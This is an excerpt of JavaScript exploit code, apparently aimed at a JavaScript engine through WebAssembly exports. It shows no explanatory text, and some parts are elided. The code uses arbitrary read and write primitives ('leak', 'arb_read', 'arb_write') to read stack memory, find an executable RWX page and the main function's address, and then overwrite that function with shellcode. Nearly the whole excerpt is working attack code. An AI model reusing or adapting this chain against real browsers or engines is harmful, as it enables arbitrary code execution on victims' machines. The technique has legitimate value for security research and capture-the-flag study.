...
let leak = instance.exports.leak;
let arb_write = instance.exports.arb_write;
let arb_read = instance.exports.arb_read;

main();
leak();

// print("stack_value : 0x" + stack_addr.toString(16));

// for(let i = 0;i < 100;i++) {
//   let leak_stack_value = arb_read(stack_addr + BigInt(i * 8 - 7));
//   print(`offset 0x${(i*8).toString(16)} : 0x${leak_stack_value.toString(16)}`);
// }

let rwx_page_addr = arb_read(stack_addr + BigInt(0x20 - 7)) - 0x40n;
print("rwx_page_addr : 0x" + rwx_page_addr.toString(16));
let main_func_offset = (arb_read(rwx_page_addr - 7n) >> 8n) & 0xffffn;
let main_func_addr = rwx_page_addr + main_func_offset + 0x5n;
print("main_func_addr : 0x" + main_func_addr.toString(16));
...
for(let i = 0;i < shellcode.length;i++) {
  arb_write(main_func_addr + BigInt(i * 8 - 7),shellcode[i]);
}
